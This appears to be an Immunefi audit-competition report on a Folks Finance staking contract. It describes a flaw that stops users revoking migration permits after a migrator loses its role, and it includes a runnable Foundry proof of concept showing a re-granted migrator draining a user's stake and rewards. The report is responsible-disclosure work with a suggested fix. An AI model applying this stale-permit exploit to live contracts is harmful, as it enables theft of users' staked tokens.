# 69678 sc low lack of conditional role check in setmigrationpermit prevents users from revoking permits leading to unauthorized migration and theft of unclaimed yield

**Submitted on Mar 16th 2026 at 08:30:35 UTC by @stendal for** [**Audit Comp | Folks Finance: Staking Contracts**](https://immunefi.com/audit-competition/audit-comp-folks-finance-staking-contracts)

* **Report ID:** #69678
* **Report Type:** Smart Contract
* **Report severity:** Low
* **Target:** <https://github.com/Folks-Finance/folks-staking-contracts/blob/main/src/Staking.sol>
* **Impacts:**
  * Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)
  * Theft of unclaimed yield

## Description

I found an issue in `setMigrationPermit()` where the role check blocks users from revoking their migration permits. The function always requires `hasRole(MIGRATOR_ROLE, _migrator)` to pass, even when the user is trying to set the permit to `false`. This means if an admin removes the migrator role from some address, any user who previously approved that address is now stuck — they literally can't undo their approval. The `setMigrationPermit(M, false)` call just reverts with `MigratorNotFound`. The real problem kicks in if that same address ever gets the migrator role back — now it can migrate the user's funds using an old permit the user already tried to cancel.

### Vulnerability Details

Here's the problematic function in `Staking.sol` (lines 77-82):

```solidity
function setMigrationPermit(address _migrator, bool _isMigrationPermitted) external {
    if (!hasRole(MIGRATOR_ROLE, _migrator)) revert MigratorNotFound(_migrator);
    migrationPermits[_migrator][msg.sender] = _isMigrationPermitted;
    emit MigrationPermitUpdated(_migrator, msg.sender, _isMigrationPermitted);
}
```

The `hasRole()` check doesn't care whether you're granting or revoking. It just blocks you if the target address doesn't currently hold `MIGRATOR_ROLE`. That's fine for granting — you shouldn't approve a non-migrator. But for revoking? A user should always be able to revoke their own approval, regardless of the target's current role status.

Here's how it plays out in practice:

1. Admin grants `MIGRATOR_ROLE` to address `M`
2. Alice approves `M` for migration: `setMigrationPermit(M, true)` — works fine
3. Some time later, admin revokes `MIGRATOR_ROLE` from `M` (maybe security concerns, maybe just reorganizing)
4. Alice hears about this and wants to clean up her approval: `setMigrationPermit(M, false)` — reverts with `MigratorNotFound(M)`
5. Alice's approval is stuck as `true` in the `migrationPermits` mapping. There's no other way to clear it
6. Later, admin re-grants `MIGRATOR_ROLE` to `M` (could be for legitimate reasons involving other users, could be a mistake, could be a compromised admin key)
7. `M` calls `migratePositionsFrom(alice)` — passes the permit check because Alice's old approval is still there
8. Alice's staked tokens + unclaimed rewards get transferred to `M`

The key thing is `migratePositionsFrom()` sends tokens directly to `msg.sender`:

```solidity
TOKEN.safeTransfer(msg.sender, unclaimedUserAmount + unclaimedUserRewards);
```

Nothing at the protocol level forces `M` to actually forward those tokens to a real V2 contract. If `M` is acting maliciously, Alice's funds are just gone.

I also checked the existing test coverage — `test_Migration_RevertWhen_RevokedMigrator` only tests that a de-roled migrator can't call `migratePositionsFrom`. It never tests what happens when a user tries to revoke their permit after role revocation, and it doesn't cover the re-grant scenario at all.

### Impact Details

When this plays out, the migrator gets the user's entire unclaimed position — both the staked principal and any accrued rewards. In my PoC, Alice staked 10 ETH and the migrator walked away with \~10.082 ETH (principal + earned rewards) without Alice's current consent.

The user explicitly tried to protect themselves by calling `setMigrationPermit(M, false)`, but the contract blocked that call. The whole migration system is supposed to be opt-in — the README says "Migration is entirely opt-in. Users must explicitly grant permission" — but this bug breaks that guarantee because once you've granted permission, you might not be able to take it back.

There's no workaround either. The only thing a user could do is withdraw all their stakes before the role gets re-granted, but that's not always possible if the staking duration hasn't expired yet. The user is effectively locked in with no way to revoke their approval.

### References

* Affected function: <https://github.com/Folks-Finance/folks-staking-contracts/blob/main/src/Staking.sol#L77-L82>
* Migration function that acts on the stale permit: <https://github.com/Folks-Finance/folks-staking-contracts/blob/main/src/Staking.sol#L166-L210>
* Token transfer to migrator (line 206): <https://github.com/Folks-Finance/folks-staking-contracts/blob/main/src/Staking.sol#L206>

## Proof of Concept

Here's a step-by-step walkthrough of the attack, followed by a runnable Foundry test.

Attack flow:

1. Deploy staking contract, set up a staking period (30 days lock, 10 days unlock, 10% APR)
2. Admin grants `MIGRATOR_ROLE` to address `M`
3. Alice stakes 10 ETH
4. Alice calls `setMigrationPermit(M, true)` to approve `M` for migration
5. Admin revokes `MIGRATOR_ROLE` from `M`
6. Alice calls `setMigrationPermit(M, false)` — this reverts with `MigratorNotFound`. Alice cannot revoke her permit
7. We verify `migrationPermits[M][alice]` is still `true`
8. Admin re-grants `MIGRATOR_ROLE` to `M`
9. `M` calls `migratePositionsFrom(alice)` — succeeds because the stale permit is still active
10. Alice's entire position (10 ETH + 0.082 ETH rewards = 10.082 ETH) is transferred to `M`
11. Alice's `userStakes` array is empty — her position is gone

Foundry test — place in `test/` and run with `forge test --match-test test_Finding1_StalePermitAfterRoleRevoke -vvv`:

```solidity
// SPDX-License-Identifier: BUSL-1.1
pragma solidity ^0.8.23;

import {ERC20Permit, ERC20} from "openzeppelin-contracts/contracts/token/ERC20/extensions/ERC20Permit.sol";
import {Test, console} from "forge-std/Test.sol";
import {Staking} from "../src/Staking.sol";
import {IStakingV1} from "../src/interfaces/IStakingV1.sol";

contract AuditToken is ERC20Permit {
    constructor() ERC20Permit("AuditToken") ERC20("AuditToken", "ATK") {}
}

contract Finding1Test is Test {
    Staking public staking;
    AuditToken public token;

    address public admin = address(0xAD);
    address public manager = address(0xBA);
    address public pauser = address(0xCA);
    address public migratorAddr = address(0xDA);
    address public alice = address(0xA1);

    function setUp() public {
        token = new AuditToken();
        staking = new Staking(admin, manager, pauser, address(token));
        vm.prank(admin);
        staking.grantRole(keccak256("MIGRATOR"), migratorAddr);
    }

    function test_Finding1_StalePermitAfterRoleRevoke() public {
        // Setup: fund contract with reward pool, give Alice tokens
        deal(address(token), address(staking), 1000 ether);
        deal(address(token), alice, 100 ether);

        // Create a staking period: 50 ETH cap, 30d lock, 10d unlock, 10% APR
        vm.prank(manager);
        uint8 periodIndex = staking.addStakingPeriod(50 ether, 30 days, 10 days, 1000, true);

        // Alice stakes 10 ETH
        vm.startPrank(alice);
        token.approve(address(staking), 10 ether);
        staking.stake(
            periodIndex,
            10 ether,
            IStakingV1.StakeParams({
                maxStakingDurationSeconds: 30 days,
                maxUnlockDurationSeconds: 10 days,
                minAprBps: 1000,
                referrer: address(0)
            })
        );
        vm.stopPrank();

        // Step 1: Alice grants migration permit to migratorAddr
        vm.prank(alice);
        staking.setMigrationPermit(migratorAddr, true);
        assertTrue(staking.migrationPermits(migratorAddr, alice), "Permit should be true");

        // Step 2: Admin revokes MIGRATOR_ROLE from migratorAddr
        vm.prank(admin);
        staking.revokeRole(keccak256("MIGRATOR"), migratorAddr);
        assertFalse(staking.hasRole(keccak256("MIGRATOR"), migratorAddr), "Role should be revoked");

        // Step 3: Alice tries to revoke her permit — REVERTS!
        vm.prank(alice);
        vm.expectRevert(abi.encodeWithSelector(IStakingV1.MigratorNotFound.selector, migratorAddr));
        staking.setMigrationPermit(migratorAddr, false);

        // Permit is STILL true — Alice is stuck
        assertTrue(staking.migrationPermits(migratorAddr, alice), "Permit should still be true - user cannot revoke");

        // Step 4: Admin re-grants MIGRATOR_ROLE
        vm.prank(admin);
        staking.grantRole(keccak256("MIGRATOR"), migratorAddr);

        // Step 5: Migrator exploits the stale permit
        uint256 stakingBalanceBefore = token.balanceOf(address(staking));

        vm.prank(migratorAddr);
        IStakingV1.UserStake[] memory migrated = staking.migratePositionsFrom(alice);

        // Verify: Alice's stake was migrated without her current consent
        assertEq(migrated.length, 1, "One stake should be migrated");
        assertEq(migrated[0].amount, 10 ether, "Full 10 ETH principal migrated");
        assertEq(staking.getUserStakes(alice).length, 0, "Alice has no stakes left");

        // Tokens went to migratorAddr
        uint256 tokensTransferred = stakingBalanceBefore - token.balanceOf(address(staking));
        assertGt(tokensTransferred, 10 ether, "More than principal transferred (includes rewards)");
        assertEq(token.balanceOf(migratorAddr), tokensTransferred, "Migrator received the tokens");

        console.log("Tokens taken from Alice without consent:", tokensTransferred);
        // Output: 10082191780821917808 (~10.082 ETH)
    }
}
```

Output:

```
[PASS] test_Finding1_StalePermitAfterRoleRevoke() (gas: 760740)
Logs:
Tokens taken from Alice without consent: 10082191780821917808
```

### Suggested fix

Only check role when granting, allow revocation anytime:

```solidity
function setMigrationPermit(address _migrator, bool _isMigrationPermitted) external {
    if (_isMigrationPermitted && !hasRole(MIGRATOR_ROLE, _migrator)) {
        revert MigratorNotFound(_migrator);
    }
    migrationPermits[_migrator][msg.sender] = _isMigrationPermitted;
    emit MigrationPermitUpdated(_migrator, msg.sender, _isMigrationPermitted);
}
```
